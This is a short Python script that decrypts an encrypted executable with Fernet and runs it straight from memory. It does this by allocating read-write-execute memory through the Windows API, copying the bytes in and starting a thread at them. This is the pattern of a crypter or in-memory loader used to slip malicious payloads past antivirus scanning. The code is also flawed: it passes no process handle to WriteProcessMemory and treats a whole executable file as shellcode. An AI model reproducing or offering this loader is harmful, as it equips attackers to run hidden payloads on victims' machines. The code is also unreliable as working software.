import ctypes
import io
import os
from cryptography.fernet import Fernet

# Load the encrypted software into memory
with open("encrypted_software.exe", "rb") as f:
    encrypted_data = f.read()

# Decrypt the software in memory
key = b"<INSERT KEY HERE>"
cipher = Fernet(key)
encrypted_file = io.BytesIO(encrypted_data)
decrypted_data = cipher.decrypt(encrypted_file.read())

# Allocate memory for the decrypted software
size = len(decrypted_data)
addr = ctypes.windll.kernel32.VirtualAlloc(None, size, 0x3000, 0x40)

# Write the decrypted software to memory
ctypes.windll.kernel32.WriteProcessMemory(None, addr, decrypted_data, size, None)

# Create a new thread to execute the decrypted software in memory
thread_id = ctypes.c_ulong(0)
ctypes.windll.kernel32.CreateThread(None, 0, addr, None, 0, ctypes.byref(thread_id))
